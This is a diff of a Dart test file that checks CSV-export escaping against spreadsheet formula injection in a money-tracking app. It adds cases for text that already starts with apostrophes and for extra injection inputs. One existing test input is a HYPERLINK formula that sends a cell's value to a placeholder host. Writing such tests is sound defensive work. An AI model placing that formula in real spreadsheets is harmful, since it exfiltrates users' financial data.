@@ -128,11 +128,40 @@ void main() {
     expect(rows[1][5], "'@Bank");
   });
 
+  test('a text that already starts with an apostrophe gets one more', () {
+    final rows = _export([
+      for (final title in ['-x', "'-x", "''-x", "'x"])
+        MoneyTransaction(
+          id: title,
+          date: DateTime(2026, 5, 15),
+          value: -1,
+          isHidden: false,
+          type: TransactionType.expense,
+          account: _account('Bank', 'EUR'),
+          accountCurrency: _eur,
+          title: title,
+          currentValueInPreferredCurrency: -1,
+          tags: const [],
+        ),
+    ]);
+
+    expect(rows.skip(1).map((row) => row[3]), ["'-x", "''-x", "'''-x", "'x"]);
+  });
+
   test('a text cell survives an export and a re-import', () async {
     final titles = [
       '-Almuerzo',
       '=HYPERLINK("https://example.invalid/?d="&F2,"x")',
       "'Almuerzo",
+      '-x',
+      "'-x",
+      "''-x",
+      '=SUMA(A1)',
+      '@a',
+      "'=1",
+      "'",
+      "x'-y",
+      '\t-x',
     ];
 
     for (final title in titles) {
